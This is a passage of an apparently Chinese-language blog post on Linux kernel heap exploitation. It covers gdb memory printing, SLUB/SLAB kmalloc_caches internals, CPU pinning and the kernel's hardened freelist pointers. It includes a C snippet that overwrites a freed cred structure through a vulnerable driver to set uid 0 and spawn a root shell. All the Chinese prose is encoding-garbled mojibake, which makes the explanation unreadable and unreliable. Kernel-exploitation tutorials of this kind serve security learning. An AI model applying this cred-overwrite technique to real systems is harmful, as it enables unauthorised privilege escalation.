class="built_in">printf</span>(<span class="string">&quot;0x%04x\t&quot;</span>,rowLen);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx  &quot;</span>,*data++);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx\n&quot;</span>,*data++);</span><br><span class="line">        rowLen = rowLen+<span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x50</span>];</span><br><span class="line"><span class="built_in">memset</span>(data,<span class="string">&#x27;\xaa&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">memset</span>(data+<span class="number">0x10</span>,<span class="string">&#x27;\xbb&#x27;</span>, <span class="number">0x20</span>);</span><br><span class="line">gdbPrint(data,<span class="number">0x50</span>);</span><br></pre></td></tr></table></div></figure>

<p>å®ç°æ•ˆæœ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512151331110.png" alt="image-20220512151331110"></p>

        <h2 id="3-é¢œè‰²æ‰“å°"   >
          <a href="#3-é¢œè‰²æ‰“å°" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-é¢œè‰²æ‰“å°" class="headerlink" title="3.é¢œè‰²æ‰“å°"></a>3.é¢œè‰²æ‰“å°</h2>
      
        <h1 id="äº”ã€æœç´¢å†…å­˜"   >
          <a href="#äº”ã€æœç´¢å†…å­˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#äº”ã€æœç´¢å†…å­˜" class="headerlink" title="äº”ã€æœç´¢å†…å­˜"></a>äº”ã€æœç´¢å†…å­˜</h1>
      <p>å½“ä¸çŸ¥é“å†…å­˜åœ¨å“ªé‡Œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨pedaçš„æœç´¢åŠŸèƒ½ï¼Œæœç´¢åœ°å€èŒƒå›´ï¼Œå¸¸å¸¸åœ¨æ“æ§æ ˆæ—¶å¾ˆå¥½ç”¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;galf&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201141705373.png" alt="image-20220114170510292"></p>

        <h1 id="å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨"   >
          <a href="#å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨" class="headerlink" title="å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨"></a>å…­ã€å¸¸è§æ¼æ´åŠåˆ©ç”¨</h1>
      
        <h2 id="1-å †"   >
          <a href="#1-å †" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å †" class="headerlink" title="1.å †"></a>1.å †</h2>
      
        <h3 id="å‰ç½®çŸ¥è¯†"   >
          <a href="#å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3>
      
        <h4 id="åˆ†é…æ–¹å¼"   >
          <a href="#åˆ†é…æ–¹å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ†é…æ–¹å¼" class="headerlink" title="åˆ†é…æ–¹å¼"></a>åˆ†é…æ–¹å¼</h4>
      <p>é€šå¸¸è€Œè¨€ä¸ºä¸¤ç§åˆ†é…æ–¹å¼SLUBæˆ–è€…SLABï¼ŒSLUBé»˜è®¤ä¼šå¸¦ä¸ŠSLABï¼Œä½†æ˜¯å¯ä»¥è¿›è¡Œè®¾ç½®ï¼Œæ¯”å¦‚åœ¨ç¼–è¯‘å†…æ ¸çš„æ—¶å€™ï¼Œä½¿ç”¨<code>CONFIG_SLUB=n</code>ï¼Œ <code>CONFIG_SLAB=y</code>è¿™æ ·ç¼–è¯‘å‡ºæ¥çš„å†…æ ¸å°±ä¸€å®šæ˜¯SLABåˆ†é…çš„äº†ã€‚</p>

        <h4 id="åˆ†é…åŸºåœ°å€"   >
          <a href="#åˆ†é…åŸºåœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ†é…åŸºåœ°å€" class="headerlink" title="åˆ†é…åŸºåœ°å€"></a>åˆ†é…åŸºåœ°å€</h4>
      <p>kmalloc ä»çº¿æ€§æ˜ å°„åŒºåˆ†é…å†…å­˜ï¼Œè¿™å—åŒºåŸŸçš„çº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„æ˜¯<strong>è¿ç»­çš„</strong>ï¼Œå…¶èµ·å§‹åœ°å€ä¸º <code>page_offset_base</code>ï¼Œåœ¨ä¸å¼€å¯KASLRçš„æƒ…å†µå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203251436512.png" alt="image-20220325143607447"></p>

        <h4 id="kmalloc-caches"   >
          <a href="#kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmalloc-caches" class="headerlink" title="kmalloc_caches"></a>kmalloc_caches</h4>
      <p>ä½œä¸ºä¸€ä¸ª<code>kmem_cache</code>çš„ç»“æ„ä½“æ•°ç»„ï¼Œç®¡ç†ç€å¤šä¸ª<code>kmem_cache</code>ç»“æ„ä½“æŒ‡é’ˆã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131247422.png" alt="image-20220313124755307"></p>
<p>ä½†æ˜¯ä¸åŒç‰ˆæœ¬ä¸‹ï¼Œç”±äºåˆ†é…æ–¹å¼çš„ä¸åŒï¼Œå¯¼è‡´ä¹Ÿä¼š<code>kmalloc_caches</code>çš„ç»“æ„æœ‰ç‚¹å˜åŒ–</p>
<p>æ¯”å¦‚åœ¨4.19.98çš„ç‰ˆæœ¬ä¸­ï¼Œ<code>kmalloc_caches</code>å°±åªæ˜¯ä¸€ç»´æ•°ç»„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617711.png" alt="image-20220313161710623"></p>
<p>è€Œåœ¨5.6çš„ç‰ˆæœ¬ä¸‹ï¼Œ<code>kmalloc_caches</code>å˜æˆäº†äºŒç»´æ•°ç»„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617882.png" alt="image-20220313161749775"></p>
<p>å¤šå‡ºæ¥çš„ä¸¤ä¸ªä¸€ç»´ç©ºé—´ï¼Œå°±å­˜æ”¾äº†<code>kmalloc-rcl</code>å’Œ<code>dma-kmalloc</code>ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ç›¸åŒçš„</p>

        <h4 id="SLUBä¸‹"   >
          <a href="#SLUBä¸‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUBä¸‹" class="headerlink" title="SLUBä¸‹"></a>SLUBä¸‹</h4>
      <p>é€šå¸¸æˆ‘ä»¬åˆ†é…çš„chunkçš„<code>freelist</code>ä¸º<code>kmalloc_caches[xx].cpu_slab.freelist + CPUX_addr</code>ï¼Œä¹Ÿå°±æ˜¯å…ˆå¾—åˆ°å¯¹åº”CPUåˆ†é…çš„åŸºåœ°å€ï¼Œç„¶ååŠ ä¸Š<code>cpu_slab.freelist </code>å³ä¸ºå¯¹åº”<code>kmalloc-xx</code>çš„<code>freelist</code>çš„å®é™…åœ°å€ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162018978.png" alt="image-20220316201816364"></p>
<p>è¿™é‡Œæˆ‘åœ¨itExpä¸­ç»‘å®šäº†ä½¿ç”¨CPU3è¿›è¡Œåˆ†é…</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __USE_GNU</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cpu_set_t</span> cpu_mask;</span><br><span class="line">CPU_ZERO(&amp;cpu_mask);<span class="comment">//åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">CPU_SET(<span class="number">3</span>,&amp;cpu_mask);<span class="comment">//ç»‘å®šCPU3è¿è¡Œç¨‹åº</span></span><br><span class="line">sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_mask), &amp;cpu_mask);</span><br></pre></td></tr></table></div></figure>


        <h5 id="ä¸€ç»´kmalloc-caches"   >
          <a href="#ä¸€ç»´kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ç»´kmalloc-caches" class="headerlink" title="ä¸€ç»´kmalloc_caches"></a>ä¸€ç»´kmalloc_caches</h5>
      <p><code>kmalloc_caches[1]~kmalloc_caches[13]</code>ä¸º<code>kmalloc-8</code>~`kmalloc-8k`</p>
<p>è€Œåœ¨åªæœ‰ä¸€ç»´ç©ºé—´çš„<code>kmalloc_caches</code>ä¸­ï¼Œå³ä¸å­˜åœ¨<code>kmalloc-rcl</code>å’Œ<code>dma-kmalloc</code>çš„ç‰ˆæœ¬ä¸‹ï¼Œæ¯”å¦‚4.19.98</p>
<p>å¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œä¹Ÿæ˜¯å¾ˆé¡ºåˆ©åœ°æ”¾å…¥CPU3å¯¹åº”çš„<code>kmalloc-32</code>çš„<code>freelist</code>ä¸­</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141222234.png" alt="image-20220314122243323"></p>
<p>ä½†æ˜¯CPUä¸ªæ•°çš„ä¸åŒï¼Œåˆ†é…çš„åŸºåœ°å€é€šå¸¸ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸ªå…·ä½“è¿˜æ˜¯çœ‹<code>__per_cpu_offset</code>è¿™ä¸ªå…¨å±€å˜é‡ä¸­ä¿å­˜çš„å†…å®¹å§ï¼Œå…·ä½“çš„ç»†èŠ‚ä¸å¤ªçŸ¥é“</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162010972.png" alt="image-20220316201020862"></p>
<p>å¦‚å›¾ä¸º4ä¸ªCPUçš„æƒ…å†µï¼Œè¿™ä¸ªè¿˜æ˜¯ä¸å¤ªä¸€æ ·çš„ã€‚</p>

        <h5 id="å¤šç»´kmalloc-caches"   >
          <a href="#å¤šç»´kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¤šç»´kmalloc-caches" class="headerlink" title="å¤šç»´kmalloc_caches"></a>å¤šç»´kmalloc_caches</h5>
      <p><code>kmalloc_caches[0][1]~kmalloc_caches[0][13]</code>ä¸º<code>kmalloc-8</code>~`kmalloc-8k`</p>
<p><code>kmalloc_caches[1][1]~kmalloc_caches[1][13]</code>ä¸º<code>kmalloc-rcl-8</code>~`kmalloc-rcl-8k`</p>
<p><code>kmalloc_caches[2][1]~kmalloc_caches[2][13]</code>ä¸º<code>dma-kmalloc-8</code>~`dma-kmalloc-8k`</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131600906.png" alt="image-20220313160048795"></p>
<p>å†…å­˜ç®¡ç†å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131521126.png" alt="img"></p>
<p>åœ¨äºŒç»´ç©ºé—´çš„<code>kmalloc_caches</code>ä¸‹ï¼Œä¾æ®CPUçš„ä¸åŒï¼Œæœ‰ä¸åŒçš„<code>freelist</code>ï¼Œæ¯”å¦‚åœ¨æœ‰4ä¸ªCPUçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ç¨‹åºç»‘å®šåœ¨CPU3ä¸Šï¼Œå¦‚ä¸Šé¢æåˆ°çš„ä¸€æ ·</p>
<p>qemuå¯åŠ¨æ•ˆæœä¹‹åï¼Œè¾“å…¥topï¼Œæ•ˆæœå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141202734.png" alt="image-20220314120253236"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬çš„<code>itExp</code>ç¨‹åºç»‘å®šçš„CPU3åˆ†é…åˆ°çš„åŸºåœ°å€å³ä¸º<code>0xffff88800f380000</code>ï¼Œç»“åˆ<code>kmalloc_caches</code>ä¸­å¯¹åº”<code>kmalloc-xxx</code>ä¸‹çš„<code>cpu_slab.freelist </code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141209330.png" alt="image-20220314120914190"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬çš„<code>kmalloc-32</code>çš„<code>freelist</code>å³ä¸º<code>0xffff88800f380000+0x2d260</code>ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é‡Šæ”¾çš„chunkç¡®å®æ˜¯æ”¾å…¥äº†CPU3ä¸Šå¯¹åº”çš„<code>kmalloc-32</code>çš„<code>freelist</code>ä¸­</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162026812.png" alt="image-20220316202605604"></p>
<p>å½“ç„¶ï¼Œåœ¨SLUBåˆ†é…ä¸‹ï¼Œç”±äºFDæŒ‡é’ˆçš„å­˜åœ¨ï¼Œfreelistæ›´åƒæ˜¯ä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œfreelistä¸­çš„ç¬¬ä¸€ä¸ªchunkä½œä¸ºé“¾è¡¨å¤´ä¾æ®FDæŒ‡é’ˆä¸²è”èµ·æ•´ä¸ªfreelist</p>

        <h4 id="ä»…SLABä¸‹"   >
          <a href="#ä»…SLABä¸‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»…SLABä¸‹" class="headerlink" title="ä»…SLABä¸‹"></a>ä»…SLABä¸‹</h4>
      <p>åŒæ ·ä¹Ÿå…·å¤‡å¤šç»´æˆ–è€…ä¸€ç»´çš„<code>kmalloc_caches</code></p>
<p><code>kmalloc_caches[0][1]~kmalloc_caches[0][2]</code>ä¸º<code>kmalloc-96~kmalloc-192</code></p>
<p><code>kmalloc_caches[0][3]~kmalloc_caches[0][4]</code>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰</p>
<p><code>kmalloc_caches[0][5]~kmalloc_caches[0][22]</code>ä¸º<code>kmalloc-32~kmalloc-4M</code></p>
<p>åŒç†å¯¹åº”çš„å¤šç»´å’Œä¸€ç»´ä¹Ÿæ˜¯ç±»ä¼¼çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131601774.png" alt="image-20220313160119681"></p>
<p>åˆ†é…æ–¹å¼ä¸Šæœ‰ç‚¹ä¸åŒï¼Œå…·ä½“çš„æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/liuhangtiant/category_7929217.html" >(41æ¡æ¶ˆæ¯) slabå†…å­˜ç®¡ç†æ–¹æ¡ˆå­¦ä¹ è®°å½•_liuhangtiantçš„åšå®¢-CSDNåšå®¢</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿™ç§æƒ…å†µä¸‹çš„Chunkå…¶å®ä¸å¸¦FDæŒ‡é’ˆçš„ï¼Œæ‰€ä»¥åªç”¨äº<code>freelist</code>ä¸Šå³å¯ï¼Œç®€å•æ¥è¯´ï¼Œslabçš„<code>freelist</code>æ›´åƒæ˜¯ä¸€ä¸ªæ•°ç»„è¿›è¡Œç´¢å¼•ã€‚</p>
<ul>
<li>é¦–å…ˆæ‰¾åˆ°ç´¢å¼•ï¼Œä¹Ÿå°±æ˜¯<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.avail</code>å¯¹åº”çš„å€¼ï¼Œä»¥<code>CPU3</code>å’Œ<code>kmalloc-1024</code>ä¸ºä¾‹ï¼š</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162039052.png" alt="image-20220316203909895"></p>
<ul>
<li>ç„¶åå†æ‰¾åˆ°<code>freelist</code>çš„åœ°å€ï¼Œå³<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162040465.png" alt="image-20220316204056370"></p>
<p>å…¶å®é€šè¿‡è§‚å¯Ÿæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œ<code>entry</code>å…¶å®ä¹Ÿå°±æ˜¯<code>cpu_cache+0x10</code>è€Œå·²ã€‚é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å¾—åˆ°freelistçš„åœ°å€ï¼Œå°±å°†å…¶å½“ä½œä¸€ä¸ªæ•°ç»„è¿›è¡Œå–ç”¨ï¼Œæ¯”å¦‚è¿™é‡Œçš„ç´¢å¼•idxä¸º2ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸‹ä¸€æ¬¡åˆ†é…å°±ä¼šå–freelist[2]è¿™ä¸ªobjï¼Œä½†æ˜¯è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œè¿™ä¸ªç´¢å¼•æ˜¯ä»1å¼€å§‹çš„ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162046044.png" alt="image-20220316204603914"></p>
<p>ä¸‹ä¸€æ¬¡åˆ†é…å–åˆ°<code>chunk</code>æ˜¯<code>0xffff88800d538400</code>è€Œé<code>0xffff88800d538c00</code>ï¼Œæˆ‘æ„Ÿè§‰è¿™ä¸ªç´¢å¼•idxæ›´åƒæ˜¯ä¸€ä¸ªè®¡æ•°ï¼Œè¡¨ç¤ºè¿˜å‰©2ä¸ªchunkå¯ç”¨ï¼Œä»å°¾éƒ¨å¼€å§‹å–ç”¨</p>

        <h5 id="ğŸ”ºæ³¨ï¼š"   >
          <a href="#ğŸ”ºæ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h5>
      <p>å½“ç„¶ä»¥ä¸Šçš„æƒ…å†µå®é™…æ“ä½œèµ·æ¥å¤ªéº»çƒ¦ï¼Œè¿˜ä¸å¦‚å†™ä¸ªå°æ’ä»¶ï¼Œè‡ªå·±è¿›è¡Œè®¡ç®—</p>
<p>å‚è€ƒè‡ªå·±å†™çš„å°å·¥å…·ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll" >PIG-007/kernelAll (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h6 id="SLABï¼š"   >
          <a href="#SLABï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLABï¼š" class="headerlink" title="SLABï¼š"></a>SLABï¼š</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162049003.png" alt="image-20220316204859800"></p>

        <h6 id="SLUBï¼š"   >
          <a href="#SLUBï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUBï¼š" class="headerlink" title="SLUBï¼š"></a>SLUBï¼š</h6>
      <p>è¿™ä¸ªå¸¦ä¸Šäº†è®¡ç®—swabå’Œrandomå€¼å¾—åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯å¼€å¯äº†hardençš„æƒ…å†µä¸‹ï¼Œå½“ç„¶ä¹Ÿè¿˜æœ‰FDåç§»ä½ç½®æ”¹å˜çš„æƒ…å†µï¼Œä¸è¿‡éœ€è¦è®¾ç½®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162051067.png" alt="image-20220316205100876"></p>

        <h3 id="ä¿®æ”¹credç»“æ„ä½“"   >
          <a href="#ä¿®æ”¹credç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¿®æ”¹credç»“æ„ä½“" class="headerlink" title="ä¿®æ”¹credç»“æ„ä½“"></a>ä¿®æ”¹credç»“æ„ä½“</h3>
      <p>è¿™ä¸ªå°±ä¸ç”¨è¯´å¤ªå¤šï¼Œé€šå¸¸æ˜¯0xa8å¤§å°çš„ç»“æ„ä½“ï¼Œæ¸…ç©ºå‰28å­—èŠ‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> credBuf[<span class="number">0xa8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">addFun(fd,<span class="number">0xa8</span>,credBuf);</span><br><span class="line">freeFun(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">idFork = fork();</span><br><span class="line"><span class="keyword">if</span>(idFork == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//get into 28*0 to set uid and gid 0</span></span><br><span class="line">    editFun(fd,<span class="number">0</span>,<span class="number">28</span>,credBuf);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]welcome root:\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(idFork &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]fork fail\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="ä¿®æ”¹FDç”³è¯·"   >
          <a href="#ä¿®æ”¹FDç”³è¯·" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¿®æ”¹FDç”³è¯·" class="headerlink" title="ä¿®æ”¹FDç”³è¯·"></a>ä¿®æ”¹FDç”³è¯·</h3>
      
        <h4 id="1-HARDENEDä¿æŠ¤"   >
          <a href="#1-HARDENEDä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-HARDENEDä¿æŠ¤" class="headerlink" title="(1)HARDENEDä¿æŠ¤"></a>(1)HARDENEDä¿æŠ¤</h4>
      <p>ä¸è¿‡ä»4.14çš„å†…æ ¸ç‰ˆæœ¬å¼€å§‹ï¼Œå°±å­˜åœ¨<code>freelist_ptr</code>åŠ å¯†äº†ï¼Œä¸è¿‡éœ€è¦åœ¨ç¼–è¯‘å†…æ ¸çš„æ—¶å€™åŠ å…¥<code>CONFIG_SLAB_FREELIST_HARDENED</code>é€‰é¡¹æ¥å¯ç”¨ï¼Œå¹¶ä¸”åŠ å¯†å½¢å¼åœ¨ä¸åŒç‰ˆæœ¬ä¸å¤ªä¸€æ ·ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.14</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v5.16</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span></span><br><span class="line"><span class="comment">	 * Normally, this doesn&#x27;t cause any issues, as both set_freepointer()</span></span><br><span class="line"><span class="comment">	 * and get_freepointer() are called with a pointer with the same tag.</span></span><br><span class="line"><span class="comment">	 * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span></span><br><span class="line"><span class="comment">	 * example, when __free_slub() iterates over objects in a cache, it</span></span><br><span class="line"><span class="comment">	 * passes untagged pointers to check_object(). check_object() in turns</span></span><br><span class="line"><span class="comment">	 * calls get_freepointer() with an untagged pointer, which causes the</span></span><br><span class="line"><span class="comment">	 * freepointer to be restored incorrectly.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			swab((<span class="keyword">unsigned</span> <span class="keyword">long</span>)kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œçš„<code>ptr</code>å³å½“å‰é‡Šæ”¾çš„chunkåœ°å€ï¼Œptr_addrä¸ºæŒ‡å‘ä¸‹ä¸€ä¸ªfree_chunkçš„åœ°å€ï¼Œæ‰€ä»¥ä¸­é—´ç›¸å½“äºæœ‰ä¸€ä¸ªrandomå€¼ä¸çŸ¥é“ã€‚è¿™ä¸ªå€¼åœ¨<code>linux/slub_def.h</code>ä¸­è¢«å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>å¹¶ä¸”åœ¨<code>mm/slub.c</code>ä¸­çš„<code>kmem_cache_open</code>å‡½æ•°ä¸­è¢«èµ‹å€¼</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kmem_cache_open</span><span class="params">(struct kmem_cache *s, <span class="keyword">slab_flags_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

